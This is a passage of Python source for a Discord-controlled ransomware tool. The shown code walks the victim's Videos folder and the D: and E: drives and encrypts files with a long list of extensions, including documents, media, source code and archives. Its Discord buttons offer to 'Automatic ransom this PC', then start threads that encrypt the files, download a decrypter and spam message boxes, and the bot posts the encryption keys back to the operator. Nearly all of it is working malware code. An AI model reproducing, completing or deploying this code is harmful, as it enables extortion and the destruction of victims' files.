                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONS = (
                                        '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONS):
                                        import threading
                                        x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                        x.start()
                                        x.join()
                    else:
                        enc_fun(password(passwd),file_input)

                    finshed = True
                    lol = 'Videos Folder : '
                    PASSWORDS.append(f"{lol}{passwd}")
                else:
                    shit = 420
            else:
                shit = 420

        # Other Drives
        def D_drive():
            userdir = f'D:\\'
            listOfFiles = list()

            file_input = userdir
            if os.path.exists(file_input):
                if file_input !="":
                    import time
                    characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
                    length = 30
                    
                    passwd = ''
                    for c in range(length):
                        passwd += random.choice(characters)

                    start = time.time()
                    if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONS = (
                                        '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONS):
                                        import threading
                                        x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                        x.start()
                                        x.join()
                    else:
                        enc_fun(password(passwd),file_input)

                    finshed = True
                    lol = 'D Drive : '
                    PASSWORDS.append(f"{lol}{passwd}")
                else:
                    shit = 420
            else:
                shit = 420

        def E_drive():
            userdir = f'E:\\'
            listOfFiles = list()

            file_input = userdir
            if os.path.exists(file_input):
                if file_input !="":
                    import time
                    characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
                    length = 30
                    
                    passwd = ''
                    for c in range(length):
                        passwd += random.choice(characters)

                    start = time.time()
                    if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONS = (
                                        '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONS):
                                        import threading
                                        x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                        x.start()
                                        x.join()
                    else:
                        enc_fun(password(passwd),file_input)

                    finshed = True
                    lol = 'E Drive : '
                    PASSWORDS.append(f"{lol}{passwd}")
                else:
                    shit = 420
            else:
                shit = 420

        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="YES"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="NO"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to Automatic ransom this PC?", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "YES":
            await ctx.send(content="Booting up auto encrypter, Please wait. . .", hidden=True)

            a = Thread(target = C_drive_desktop)
            b = Thread(target = C_drive_downloads)
            c = Thread(target = C_drive_documents)
            d = Thread(target = C_drive_music)
            e = Thread(target = C_drive_pictures)
            f = Thread(target = C_drive_videos)
            g = Thread(target = D_drive)
            h = Thread(target = E_drive)

            download = Thread(target = download_decrypter)
            message = Thread(target = spam_messagebox)

            a.start()
            b.start()
            c.start()
            d.start()
            e.start()
            f.start()
            g.start()
            h.start()
            download.start()
            message.start()

            await ctx.send(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
        else:
            await ctx.send(content="Cancelled!", hidden=True)
        
client.run(token)
